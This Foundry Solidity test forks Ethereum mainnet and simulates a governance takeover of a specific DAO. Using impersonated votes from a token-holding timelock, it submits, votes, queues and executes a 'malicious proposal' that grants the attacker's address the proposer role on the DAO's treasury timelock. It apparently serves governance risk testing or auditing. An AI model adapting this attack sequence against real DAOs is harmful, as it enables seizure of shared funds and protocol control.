// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import { Test, console } from "forge-std/Test.sol";
import { IGovernor } from "../src/interfaces/IGovernor.sol";
import { ITimelock } from "../src/interfaces/ITimelock.sol";
import { IToken } from "../src/interfaces/IToken.sol";
import { IWallet } from "../src/interfaces/IWallet.sol";

contract CounterTest is Test {
    IToken public token;
    IGovernor public governor;
    ITimelock public tokenTimelock;
    IWallet public timelock;
    bytes32 public constant TIMELOCK_ADMIN_ROLE = keccak256("TIMELOCK_ADMIN_ROLE");
    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");
    bytes32 public constant EXECUTOR_ROLE = keccak256("EXECUTOR_ROLE");

    address voter = address(0x1);

    function setUp() public {
        vm.createSelectFork({ blockNumber: 19_618_708, urlOrAlias: "mainnet" });

        token = IToken(0xC18360217D8F7Ab5e7c516566761Ea12Ce7F9D72);
        governor = IGovernor(0x323A76393544d5ecca80cd6ef2A560C6a395b7E3);
        tokenTimelock = ITimelock(0xd7A029Db2585553978190dB5E85eC724Aa4dF23f);
        timelock = IWallet(payable(0xFe89cc7aBB2C4183683ab71653C4cdc9B02D44b7));

        labelAddresses();
    }

    function test_BaseConfig() public {
        address tokenInGovernor = governor.token();
        assertEq(tokenInGovernor, address(token));

        bool governorIsProposerInWallet = timelock.hasRole(PROPOSER_ROLE, address(governor));
        assertTrue(governorIsProposerInWallet);
    }

    function test_AttackDAO() public {
        // Delegate from top token holder
        vm.prank(0xd7A029Db2585553978190dB5E85eC724Aa4dF23f);
        token.delegate(voter);

        uint256 votingPower = token.getVotes(voter);
        assertEq(votingPower, 55_004_056_347_480_195_848_226_739);

        // Need to advance 1 block for delegation to be valid on governor
        vm.roll(block.number + 1);

        // Creating a proposal that gives a proposer role to
        address[] memory targets = new address[](1);
        targets[0] = address(timelock);
        uint256[] memory values = new uint256[](1);
        values[0] = 0;
        bytes[] memory calldatas = new bytes[](1);
        calldatas[0] = abi.encodeCall(timelock.grantRole, (timelock.PROPOSER_ROLE(), voter));
        string memory description = "";
        bytes32 descriptionHash = keccak256(bytes(description));
        console.log(governor.proposalThreshold());

        // Governor //
        // Submit malicious proposal
        vm.prank(voter);
        uint256 proposalId = governor.propose(targets, values, calldatas, description);
        assertEq(governor.state(proposalId), 0);

        // Proposal is ready to vote after 2 block because of the revert ERC20Votes: block not yet mined
        vm.roll(block.number + governor.votingDelay() + 1);
        assertEq(governor.state(proposalId), 1);

        // Vote for the proposal
        vm.prank(voter);
        governor.castVote(proposalId, 1);

        // Let the voting end
        vm.roll(block.number + governor.votingPeriod());
        assertEq(governor.state(proposalId), 4);

        // Queue the proposal to be executed
        governor.queue(targets, values, calldatas, descriptionHash);
        assertEq(governor.state(proposalId), 5);

        // Calculate proposalId in timelock
        bytes32 proposalIdInTimelock =
            timelock.hashOperationBatch(targets, values, calldatas, 0, descriptionHash);
        assertTrue(timelock.isOperationPending(proposalIdInTimelock));

        // Wait the operation in the DAO wallet timelock to be Ready
        vm.warp(block.timestamp + timelock.getMinDelay() + 1);
        assertTrue(timelock.isOperationReady(proposalIdInTimelock));

        // Execute proposal
        governor.execute(targets, values, calldatas, descriptionHash);
        assertTrue(timelock.isOperationDone(proposalIdInTimelock));


        assertTrue(timelock.hasRole(PROPOSER_ROLE, voter));
        // To cancel the operation, the status needs to be pending and only the PROPOSAL_ROLE can call it
    }

    /// @dev Labels the most relevant addresses.
    function labelAddresses() internal {
        vm.label({ account: voter, newLabel: "VOTER" });
        vm.label({ account: address(governor), newLabel: "governor" });
        vm.label({ account: address(timelock), newLabel: "timelock" });
        vm.label({ account: address(timelock), newLabel: "timelock" });
        vm.label({ account: address(token), newLabel: "token" });
    }
}
